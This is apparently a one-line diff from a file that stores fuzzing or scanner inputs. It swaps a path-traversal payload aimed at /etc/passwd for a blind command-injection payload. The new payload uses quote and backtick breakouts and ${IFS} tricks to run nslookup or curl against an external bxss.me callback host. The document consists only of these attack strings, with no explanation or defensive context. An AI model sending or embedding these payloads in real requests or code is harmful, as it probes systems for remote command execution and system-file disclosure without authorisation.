@@ -1,1 +1,1 @@
-../..//../..//../..//../..//../..//../..//../..//../..//etc/passwd
+&(nslookup${IFS}-q${IFS}cname${IFS}hitbibekiwguge4e21.bxss.me||curl${IFS}hitbibekiwguge4e21.bxss.me)&'\"`0&(nslookup${IFS}-q${IFS}cname${IFS}hitbibekiwguge4e21.bxss.me||curl${IFS}hitbibekiwguge4e21.bxss.me)&`'
